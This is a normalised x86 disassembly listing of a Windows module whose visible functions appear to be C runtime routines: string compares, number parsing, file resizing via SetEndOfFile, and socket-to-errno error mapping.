push [ edi ]
call sub_10020369
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_10021f32
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10021e66
add esp 0x18
pop ebp
retn
sub_10021f52
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_100228e1
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_100228e1
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_1002203c
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021f52
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_100220e2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_10022119
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_100137b8
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_1001743c
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_100221b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10022203
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_10022230
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_100137b8
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1001d119
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_100167f3
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_1002245f
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10022230
add esp 0x14
pop ebp
retn
sub_1002248a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_1001fd25
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_100167f3
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_1001fd25
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_1001fd25
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001fd25
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_10022640
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_100167f3
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10020252
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_100167f3
mov [ eax ] 0xd
call sub_10016806
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_10016806
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_100167f3
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1001910a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10022640
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_10022640
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_100226fc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_10022735
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_100137b8
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_100167f3
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001f196
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1001d119
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10017034
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1002284a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10022735
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10022880
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100228e1
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_100137b8
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_100173e5
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_10022119
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100229b0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_100229a0
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10022a80
mov edx [ esp + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0xc ]
sub esp 0x8
push edx
lea edx [ esp + 0x4 ]
push edx
call eax
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
xor eax eax
add esp 0x8
retn 0x8
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
mov eax 0x1
add esp 0x8
retn 0x8
sub_10022b30
push 0xffffffff
push sub_100269ae
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_100286c0
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_1001457c
add esp 0x4
sub_10022ba0
push 0xffffffff
push sub_100269de
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_100286d0
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_1001457c
add esp 0x4
sub_10022c10
push esi
mov esi [ esp + 0xc ]
cmp esi 0x10b
jg r-xdata
cmp esi 0x2714
jg r-xdata
je r-xdata
lea eax [ esi - 0x2719 ]
cmp eax 0x38
ja r-xdata
je r-xdata
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x16
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
cmp esi 0xd4
ja r-xdata
call sub_10022b30
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
movzx edx [ eax + lookup_table_100232c0 ]
jmp [ edx * 4 + jump_table_10023244 ]
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x4
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
cmp esi 0x3f5
jg r-xdata
movzx eax [ esi + lookup_table_10023148 ]
jmp [ eax * 4 + jump_table_10023100 ]
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x18
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ae
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26af
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ad
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b3
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b4
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b6
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xe
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b7
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c8
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b0
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ba
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bb
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bc
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c1
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c3
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26cd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26d5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26d2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ca
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
mov eax esi
sub eax 0x4d5
je r-xdata
je r-xdata
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x11
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x13
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x29
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x1c
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x28
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x27
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xc
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
